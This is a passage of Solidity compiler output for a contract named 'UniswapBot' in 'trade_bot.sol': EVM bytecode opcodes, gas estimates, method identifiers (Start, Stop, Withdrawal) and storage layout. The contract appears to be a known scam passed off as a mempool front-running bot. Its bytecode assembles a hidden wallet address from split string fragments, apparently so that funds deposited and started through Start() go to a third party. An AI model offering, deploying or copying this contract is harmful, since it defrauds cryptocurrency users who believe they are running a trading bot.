JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7D4 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x86E JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x812 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x822 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x86D JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x860 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x86C JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x8AC JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8BC JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x956 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x8FA JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x90A JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x955 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x948 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x954 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x735 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3078450000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x19 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4162444446393530333537613242443863393634326633304200000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xB DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3339323432303430393734000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4339380000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 PUSH26 0xCD3F9A43E88015E2AC7019A7F2FA71BB38A8BB86A1DBE1BACACC 0xBD CHAINID CODECOPY PUSH23 0x64736F6C63430006060033000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "546000",
						"executionCost": "21447",
						"totalCost": "567447"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "infinite",
						"Withdrawal()": "infinite",
						"owner()": "1075",
						"symbol()": "infinite"
					},
					"internal": {
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"contractData()": "infinite",
						"fetchContractID()": "infinite",
						"fetchMempoolEdition()": "infinite",
						"fetchMempoolVersion()": "infinite",
						"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
						"getBalance()": "25",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "infinite",
						"getMempoolLong()": "infinite",
						"getMempoolShort()": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"startExploration(string memory)": "infinite",
						"tokenSymbol()": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a",
					"owner()": "8da5cb5b",
					"symbol()": "95d89b41"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 88,
						"contract": "trade_bot.sol:UniswapBot",
						"label": "liquidity",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 90,
						"contract": "trade_bot.sol:UniswapBot",
						"label": "pool",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					},
					{
						"astId": 92,
						"contract": "trade_bot.sol:UniswapBot",
						"label": "owner",
						"offset": 0,
						"slot": "2",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}